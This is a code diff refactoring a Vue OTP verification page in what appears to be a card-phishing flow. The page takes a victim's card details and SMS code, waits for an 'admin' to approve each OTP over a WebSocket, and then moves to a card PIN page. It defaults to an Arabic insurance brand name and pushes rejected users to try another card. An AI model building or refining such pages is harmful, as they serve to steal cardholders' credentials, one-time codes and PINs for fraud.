@@ -118,6 +118,10 @@
 </template>
 
 <script setup>
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 1 - IMPORTS & DEPENDENCIES
+// ═══════════════════════════════════════════════════════════════════════════════════
+
 import { ref, computed, onMounted, onUnmounted } from 'vue';
 import { useRouter } from 'vue-router';
 import { useI18n } from 'vue-i18n';
@@ -126,119 +130,339 @@ import { useVisitorTracking } from '@/composables/useVisitorTracking';
 import { trackStepViewed, trackOtpRequested, trackOtpResent, trackOtpExpired, trackOtpVerified, trackStepCompleted } from '@/composables/useFunnelTracking';
 import { usePayment } from '@/composables/usePayment';
 import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
-import { getOtpStatus } from '@/api/paymentApi';
-import logger from '@/utils/logger';
-import { safeRedirect } from '@/utils/safeRedirect';
-// InsLoading replaced with in-card verify overlay
 import { useCardBranding } from '@/composables/useCardBranding';
+import { getOtpStatus } from '@/api/paymentApi';
 import { getReasonLabel } from '@/constants/rejectionReasons';
+import { safeRedirect } from '@/utils/safeRedirect';
+import logger from '@/utils/logger';
 import loadingGif from '@/../../resources/images/logo/banks/loading.gif';
 
-// ─── Order data (transaction context for trust signals) ─────────────
-const orderData = (() => {
-    try { return JSON.parse( sessionStorage.getItem( 'orderData' ) || '{}' ); }
-    catch { return {}; }
-})();
-const _merchantName = computed( () => orderData?.plan?.companyName || 'تأمينكم' );
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 2 - CONSTANTS & CONFIGURATION
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+const RESEND_COOLDOWN = 180; // seconds (3 minutes)
+const CODE_EXPIRY = 300; // 5 minutes fallback
+const RESEND_MINIMUM_INTERVAL = 10000; // 10 seconds minimum between resend attempts
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 3 - ROUTER, I18N & DEPENDENCIES
+// ═══════════════════════════════════════════════════════════════════════════════════
 
 const { t } = useI18n();
 const router = useRouter();
 
-// ─── Visitor tracking ───────────────────────────────────────────────
+/**
+ * Initialize visitor tracking for OTP verification page
+ * @type {void}
+ */
 useVisitorTracking( 'otp' );
 
-// ─── Session context via composable (computed to preserve reactivity) ───
+/**
+ * Get payment context from composable (session, card, amount, etc.)
+ * @type {Object} { context, resolveCustomerIp, submitOtp, resendOtpCode, error }
+ */
 const { context, resolveCustomerIp, submitOtp: submitOtpApi, resendOtpCode, error: paymentError } = usePayment();
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 4 - STATE: SESSION & ORDER CONTEXT
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Get order data from session storage for trust signal display
+ * (merchant name, plan details, payment amount)
+ * @type {Object}
+ */
+const orderData = (() => {
+    try { return JSON.parse( sessionStorage.getItem( 'orderData' ) || '{}' ); }
+    catch { return {}; }
+})();
+
+/**
+ * Get merchant/company name from order data
+ * @type {import('vue').ComputedRef<string>}
+ */
+const _merchantName = computed( () => orderData?.plan?.companyName || 'تأمينكم' );
+
+/**
+ * Get session ID from payment context (used for polling)
+ * @type {import('vue').ComputedRef<string>}
+ */
 const sessionId = computed( () => context.sessionId || '' );
+
+/**
+ * Get customer IP address (populated during onMounted)
+ * @type {import('vue').Ref<string>}
+ */
 const customerIpRef = ref( context.customerIp || '' );
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 5 - STATE: CARD & PAYMENT DETAILS
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Get card BIN for branding (network and bank logo detection)
+ * @type {import('vue').ComputedRef<string>}
+ */
 const cardBin = computed( () => context.cardBin || '' );
+
+/**
+ * Get last 4 digits of card for display
+ * @type {import('vue').ComputedRef<string>}
+ */
 const cardLast4 = computed( () => context.cardLast4 || '****' );
+
+/**
+ * Get card holder name
+ * @type {import('vue').ComputedRef<string>}
+ */
 const _cardHolder = computed( () => context.cardHolder || '' );
+
+/**
+ * Get total payment amount for this transaction
+ * @type {import('vue').ComputedRef<number>}
+ */
 const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );
 
-// ─── Card branding (network + bank) ────────────────────────────────
-const { brand, networkLogo, networkName, bankLogo, bankName } = useCardBranding( cardBin );
-
-const displayBankLogo = computed( () => bankLogo.value || null );
-const displayNetworkLogo = computed( () => networkLogo.value || null );
-const displayBankName = computed( () => bankName.value || 'البنك' );
-const displayNetworkName = computed( () => networkName.value || brand.value || 'Card' );
-const hasAnyBranding = computed( () => Boolean( displayBankLogo.value || displayNetworkLogo.value ) );
-
-const RESEND_COOLDOWN = 180; // seconds
-const CODE_EXPIRY = 300; // 5 minutes fallback
-
+/**
+ * Format amount for display with 2 decimal places and locale formatting
+ * @type {import('vue').ComputedRef<string>}
+ */
 const formattedAmount = computed( () =>
     totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } )
 );
 
-// ─── OTP State ──────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 6 - STATE: OTP INPUT & VALIDATION
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * User-entered OTP code
+ * @type {import('vue').Ref<string>}
+ */
 const otpCode = ref( '' );
+
+/**
+ * Reference to OTP input element for focus/clear operations
+ * @type {import('vue').Ref<HTMLElement|null>}
+ */
 const otpInputRef = ref( null );
+
+/**
+ * Check if OTP code is valid format (4 or 6 digits)
+ * @type {import('vue').ComputedRef<boolean>}
+ */
+const isOtpValid = computed( () => /^(\d{4}|\d{6})$/.test( otpCode.value ) );
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 7 - STATE: SUBMISSION & ERROR HANDLING
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Is OTP verification in progress (waiting for admin/payment gateway)
+ * @type {import('vue').Ref<boolean>}
+ */
 const isVerifying = ref( false );
+
+/**
+ * Is resend code request in progress
+ * @type {import('vue').Ref<boolean>}
+ */
 const isResending = ref( false );
-const lastResendAt = ref( 0 );
+
+/**
+ * Error message from OTP submission or resend
+ * @type {import('vue').Ref<string>}
+ */
 const error = ref( '' );
+
+/**
+ * Timestamp of last resend attempt (prevents rapid-fire resend spam)
+ * @type {import('vue').Ref<number>}
+ */
+const lastResendAt = ref( 0 );
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 8 - COMPUTED: CARD BRANDING & TRUST SIGNALS
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Get card branding info from BIN (network and bank detection)
+ * @type {Object} { brand, networkLogo, networkName, bankLogo, bankName }
+ */
+const { brand, networkLogo, networkName, bankLogo, bankName } = useCardBranding( cardBin );
+
+/**
+ * Get bank logo for display (from branding composable)
+ * @type {import('vue').ComputedRef<string|null>}
+ */
+const displayBankLogo = computed( () => bankLogo.value || null );
+
+/**
+ * Get payment network logo for display (Visa, Mastercard, Mada, etc.)
+ * @type {import('vue').ComputedRef<string|null>}
+ */
+const displayNetworkLogo = computed( () => networkLogo.value || null );
+
+/**
+ * Get bank name for accessibility/alt text
+ * @type {import('vue').ComputedRef<string>}
+ */
+const displayBankName = computed( () => bankName.value || 'البنك' );
+
+/**
+ * Get network name for accessibility/alt text
+ * @type {import('vue').ComputedRef<string>}
+ */
+const displayNetworkName = computed( () => networkName.value || brand.value || 'Card' );
+
+/**
+ * Check if any branding logos should be displayed
+ * @type {import('vue').ComputedRef<boolean>}
+ */
+const hasAnyBranding = computed( () => Boolean( displayBankLogo.value || displayNetworkLogo.value ) );
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 9 - STATE: TIMERS (RESEND COOLDOWN & CODE EXPIRY)
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Seconds remaining until user can resend OTP code
+ * @type {import('vue').Ref<number>}
+ */
 const resendTimer = ref( RESEND_COOLDOWN );
+
+/**
+ * Interval ID for resend timer countdown
+ * @type {number|null}
+ */
 let timerInterval = null;
 
-// ─── Code Expiry Timer (server-synced via expires_at) ───────────────
+/**
+ * Seconds remaining until OTP code expires
+ * Synced with server's expires_at timestamp for accuracy across tab switches/reloads
+ * @type {import('vue').Ref<number>}
+ */
 const codeExpiry = ref( CODE_EXPIRY );
+
+/**
+ * Interval ID for code expiry countdown
+ * @type {number|null}
+ */
 let expiryInterval = null;
+
+/**
+ * Check if OTP code has expired
+ * @type {import('vue').ComputedRef<boolean>}
+ */
 const codeExpired = computed( () => codeExpiry.value <= 0 );
+
+/**
+ * Check if OTP code expiry is urgent (< 30 seconds)
+ * Used to show visual warning to user
+ * @type {import('vue').ComputedRef<boolean>}
+ */
 const expiryUrgent = computed( () => codeExpiry.value > 0 && codeExpiry.value <= 30 );
 
-const formattedExpiry = computed( () =>
-{
+/**
+ * Format code expiry time for display (MM:SS)
+ * @type {import('vue').ComputedRef<string>}
+ */
+const formattedExpiry = computed( () => {
     const m = Math.floor( codeExpiry.value / 60 );
     const s = codeExpiry.value % 60;
     return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
 } );
 
-function startExpiryTimer ()
-{
+/**
+ * Format resend timer for display (MM:SS)
+ * @type {import('vue').ComputedRef<string>}
+ */
+const _formattedTimer = computed( () => {
+    const m = Math.floor( resendTimer.value / 60 );
+    const s = resendTimer.value % 60;
+    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
+} );
+
+/**
+ * Get resend timer progress as percentage (0-100)
+ * @type {import('vue').ComputedRef<number>}
+ */
+const _timerPercent = computed( () =>
+    Math.round( ( resendTimer.value / RESEND_COOLDOWN ) * 100 )
+);
+
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 10 - TIMER MANAGEMENT: RESEND COOLDOWN & CODE EXPIRY
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Start the resend button cooldown timer
+ * Prevents rapid-fire resend attempts; resets to 180s after successful resend
+ * @returns {void}
+ */
+function startResendTimer() {
+    if ( timerInterval ) clearInterval( timerInterval );
+    resendTimer.value = RESEND_COOLDOWN;
+    timerInterval = setInterval( () => {
+        if ( resendTimer.value > 0 ) {
+            resendTimer.value--;
+        } else {
+            clearInterval( timerInterval );
+        }
+    }, 1000 );
+}
+
+/**
+ * Start the OTP code expiry countdown timer
+ * Syncs with server's expires_at timestamp to prevent drift across tab switches/reloads
+ * If server timestamp is available, uses it; otherwise falls back to local countdown
+ * @returns {void}
+ */
+function startExpiryTimer() {
     if ( expiryInterval ) clearInterval( expiryInterval );
 
     // Use server's expires_at if available (survives route re-entry + tab switching)
     const serverExpiry = context.otpExpiresAt;
-    if ( serverExpiry )
-    {
+    if ( serverExpiry ) {
         const remaining = Math.max( 0, Math.floor( ( new Date( serverExpiry ) - Date.now() ) / 1000 ) );
         codeExpiry.value = remaining;
-    } else
-    {
+    } else {
         codeExpiry.value = CODE_EXPIRY;
     }
 
     if ( codeExpiry.value <= 0 ) return;
 
-    expiryInterval = setInterval( () =>
-    {
+    expiryInterval = setInterval( () => {
         // Re-calculate from server timestamp each tick to prevent drift
         const serverExp = context.otpExpiresAt;
-        if ( serverExp )
-        {
+        if ( serverExp ) {
             codeExpiry.value = Math.max( 0, Math.floor( ( new Date( serverExp ) - Date.now() ) / 1000 ) );
-        } else
-        {
+        } else {
             codeExpiry.value = Math.max( 0, codeExpiry.value - 1 );
         }
 
-        if ( codeExpiry.value <= 0 )
-        {
+        if ( codeExpiry.value <= 0 ) {
             clearInterval( expiryInterval );
             trackOtpExpired();
         }
     }, 1000 );
 }
 
-const isOtpValid = computed( () => /^(\d{4}|\d{6})$/.test( otpCode.value ) );
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 11 - OTP CODE EXTRACTION & INPUT HANDLING
+// ═══════════════════════════════════════════════════════════════════════════════════
 
-function extractOtpCode ( raw )
-{
+/**
+ * Extract OTP code from raw text input (handles 4-6 digit codes, paste events)
+ * Prefers standalone tokens; falls back to collecting all digits
+ * @param {string} raw - Raw text input from user or clipboard
+ * @returns {string} Extracted 4-6 digit OTP code
+ */
+function extractOtpCode( raw ) {
     const text = String( raw || '' );
 
-    // Prefer exact standalone 4-6 digit OTP tokens first
+    // Prefer exact standalone 4-6 digit OTP tokens first (handles formatted pastes like "123-456")
     const token = text.match( /(?:^|\D)(\d{4,6})(?:\D|$)/ );
     if ( token?.[1] ) return token[1];
 
@@ -247,13 +471,23 @@ function extractOtpCode ( raw )
     return digits.slice( 0, 6 );
 }
 
-function handleOtpInput ( event )
-{
+/**
+ * Handle OTP input in text field
+ * Extracts and validates code format
+ * @listens input on OTP field
+ * @param {Event} event - Input event from field
+ */
+function handleOtpInput( event ) {
     otpCode.value = extractOtpCode( event?.target?.value );
 }
 
-function handleOtpPaste ( event )
-{
+/**
+ * Handle OTP paste event (from SMS or clipboard)
+ * Extracts code and prevents default paste behavior
+ * @listens paste on OTP field
+ * @param {ClipboardEvent} event - Paste event with clipboard data
+ */
+function handleOtpPaste( event ) {
     const pasted = event?.clipboardData?.getData( 'text' ) || '';
     const extracted = extractOtpCode( pasted );
     if ( extracted ) {
@@ -262,36 +496,19 @@ function handleOtpPaste ( event )
     }
 }
 
-const _formattedTimer = computed( () =>
-{
-    const m = Math.floor( resendTimer.value / 60 );
-    const s = resendTimer.value % 60;
-    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
-} );
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 12 - OTP SUBMISSION HANDLER
+// ═══════════════════════════════════════════════════════════════════════════════════
 
-const _timerPercent = computed( () =>
-    Math.round( ( resendTimer.value / RESEND_COOLDOWN ) * 100 )
-);
-
-function startResendTimer ()
-{
-    if ( timerInterval ) clearInterval( timerInterval );
-    resendTimer.value = RESEND_COOLDOWN;
-    timerInterval = setInterval( () =>
-    {
-        if ( resendTimer.value > 0 )
-        {
-            resendTimer.value--;
-        } else
-        {
-            clearInterval( timerInterval );
-        }
-    }, 1000 );
-}
-
-// ─── Submit OTP ─────────────────────────────────────────────────────
-const submitOtp = async () =>
-{
+/**
+ * Submit OTP code for verification
+ * Calls payment API and waits for WebSocket response (admin review or automatic gateway response)
+ * Updates UI state during verification process
+ *
+ * @async
+ * @returns {Promise<void>}
+ */
+async function submitOtp() {
     if ( !isOtpValid.value || isVerifying.value ) return;
 
     isVerifying.value = true;
@@ -299,21 +516,29 @@ const submitOtp = async () =>
 
     const success = await submitOtpApi( otpCode.value );
 
-    if ( !success )
-    {
+    if ( !success ) {
         error.value = paymentError.value || t( 'verification.otp.sendCodeError' );
         isVerifying.value = false;
-    } else
-    {
+    } else {
         logger.debug( '[OTP] Submitted successfully, waiting for admin approval' );
     }
-};
+}
 
-// ─── Resend OTP ─────────────────────────────────────────────────────
-const resendOtp = async () =>
-{
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 13 - OTP RESEND HANDLER
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Request a new OTP code to be sent
+ * Enforces rate limiting and prevents spam
+ * Resets timers and clears errors on success
+ *
+ * @async
+ * @returns {Promise<void>}
+ */
+async function resendOtp() {
     if ( isResending.value ) return;
-    if ( Date.now() - lastResendAt.value < 10000 ) return; // 10s minimum between resends
+    if ( Date.now() - lastResendAt.value < RESEND_MINIMUM_INTERVAL ) return; // 10s minimum between resends
     if ( resendTimer.value > 0 && !codeExpired.value ) return;
 
     isResending.value = true;
@@ -322,8 +547,7 @@ const resendOtp = async () =>
 
     const success = await resendOtpCode();
 
-    if ( success )
-    {
+    if ( success ) {
         otpCode.value = '';
         otpInputRef.value?.clear();
         isVerifying.value = false;     // unlock input after fresh code is issued
@@ -333,51 +557,64 @@ const resendOtp = async () =>
         startExpiryTimer();
         trackOtpResent();
         logger.debug( '[OTP] Resend success — codeExpiry reset to', CODE_EXPIRY );
-    } else
-    {
+    } else {
         error.value = t( 'verification.otp.resendError' );
         resendTimer.value = 0; // keep resend button visible so user can retry
     }
 
     isResending.value = false;
-};
+}
 
-// ─── WebSocket + Polling via composable ─────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 14 - WEBSOCKET & POLLING: PAYMENT GATEWAY RESPONSE HANDLING
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Setup WebSocket listener + polling for payment verification response
+ * Handles both real-time WebSocket approvals/rejections and polling fallback
+ * Routes user to next step (CardPin) or back to checkout on error
+ *
+ * @type {Object} { setup }
+ */
 const { setup: setupWs } = usePaymentWebSocket( {
     channelPrefix: 'otp',
     approvedEvent: 'OtpApproved',
     rejectedEvent: 'OtpRejected',
     logTag: 'OTP',
 
-    onApproved ( event )
-    {
+    /**
+     * Handle successful OTP verification
+     * Routes to CardPin page
+     * @param {Object} event - WebSocket approval event with optional redirect_to
+     */
+    onApproved( event ) {
         logger.debug( '[OTP] Approved:', event );
         isVerifying.value = false;
         trackOtpVerified();
         trackStepCompleted( 'otp', 'card_pin' );
 
         // Defer navigation via microtask to release the WS message handler
-        queueMicrotask( () =>
-        {
-            if ( event.redirect_to )
-            {
+        queueMicrotask( () => {
+            if ( event.redirect_to ) {
                 safeRedirect( event.redirect_to, 'cardPin', router );
-            } else
-            {
+            } else {
                 router.push( { name: 'cardPin' } );
             }
         } );
     },
 
-    onRejected ( event )
-    {
+    /**
+     * Handle OTP verification rejection or error
+     * Routes back to checkout if card change is needed
+     * @param {Object} event - WebSocket rejection event with reason code
+     */
+    onRejected( event ) {
         logger.debug( '[OTP] Rejected:', event );
         isVerifying.value = false;
 
         // Card-redirect reasons → send user back to checkout with error
         const cardRedirectReasons = [ 'otp_ewallet_not_accepted', 'otp_card_change_required' ];
-        if ( cardRedirectReasons.includes( event.reason ) )
-        {
+        if ( cardRedirectReasons.includes( event.reason ) ) {
             router.replace( { name: 'checkout', query: { rejectionReason: event.reason } } );
             return;
         }
@@ -387,79 +624,116 @@ const { setup: setupWs } = usePaymentWebSocket( {
         otpInputRef.value?.clear();
     },
 
-    async pollFn ( { handleApproved, handleRejected } )
-    {
+    /**
+     * Polling fallback for payment gateway response
+     * Queries server status periodically if WebSocket is unavailable
+     * @async
+     * @param {Object} handlers - { handleApproved, handleRejected } callbacks
+     */
+    async pollFn( { handleApproved, handleRejected } ) {
         const sig = context.statusSigs?.otp || '';
         if ( !isVerifying.value || !sessionId.value || !sig ) return;
 
         const { data } = await getOtpStatus( sessionId.value, sig );
 
-        if ( data.status === 'verified' )
-        {
+        if ( data.status === 'verified' ) {
             handleApproved( { redirect_to: null } );
-        } else if ( data.status === 'rejected' )
-        {
+        } else if ( data.status === 'rejected' ) {
             handleRejected( { reason: data.reason || 'otp_other' } );
-        } else if ( data.status === 'expired' )
-        {
+        } else if ( data.status === 'expired' ) {
             // Server confirms expiry — trigger the same path as the local timer
             handleRejected( { reason: 'otp_expired' } );
         }
     },
 } );
 
-// ─── WebOTP API — auto-fill from SMS ────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 15 - WEB OTP API: AUTOMATIC SMS CODE EXTRACTION
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Abort controller for Web OTP credential request
+ * @type {AbortController|null}
+ */
 let abortController = null;
+
+/**
+ * Has Web OTP API been requested (prevent duplicate attempts)
+ * @type {boolean}
+ */
 let webOtpRequested = false;
 
-async function initWebOTP ()
-{
+/**
+ * Initialize Web OTP API for automatic SMS code extraction
+ * Requests OTP credential from user's device (if SMS permissions granted)
+ * Browser auto-fills OTP input if user approves
+ *
+ * @async
+ * @returns {Promise<void>}
+ */
+async function initWebOTP() {
     if ( webOtpRequested ) return;
     if ( !( 'OTPCredential' in window ) ) return;
 
     webOtpRequested = true;
 
-    try
-    {
+    try {
         abortController = new AbortController();
         const content = await navigator.credentials.get( {
             otp: { transport: [ 'sms' ] },
             signal: abortController.signal,
         } );
 
-        if ( content?.code )
-        {
+        if ( content?.code ) {
             const code = extractOtpCode( content.code );
             otpCode.value = code;
         }
-    } catch
-    {
+    } catch {
         // User cancelled or not supported — silent
     }
 }
 
-// ─── Lifecycle ──────────────────────────────────────────────────────
-onMounted( async () =>
-{
+// ═══════════════════════════════════════════════════════════════════════════════════
+// SECTION 16 - LIFECYCLE HOOKS: MOUNT & UNMOUNT
+// ═══════════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Initialize OTP verification page
+ * Sets up timers, WebSocket listener, localization, and auto-fill
+ *
+ * @async
+ */
+onMounted( async () => {
     // Force Arabic locale on payment pages
     if ( i18n.global.locale.value !== 'ar' ) {
         i18n.global.locale.value = 'ar';
     }
 
+    // Resolve customer IP if not already available
     const ip = customerIpRef.value || await resolveCustomerIp();
     customerIpRef.value = ip;
 
+    // Focus OTP input and start timers
     otpInputRef.value?.focusFirstEmpty();
     startResendTimer();
     startExpiryTimer();
+
+    // Setup WebSocket listener + polling for payment gateway response
     setupWs( sessionId.value );
+
+    // Attempt automatic SMS code extraction (Web OTP API)
     initWebOTP();
+
+    // Track user reached OTP verification step
     trackStepViewed( 'otp' );
     trackOtpRequested();
 } );
 
-onUnmounted( () =>
-{
+/**
+ * Cleanup on unmount
+ * Clears all intervals and cancels pending Web OTP request
+ */
+onUnmounted( () => {
     if ( timerInterval ) clearInterval( timerInterval );
     if ( expiryInterval ) clearInterval( expiryInterval );
     if ( abortController ) abortController.abort();
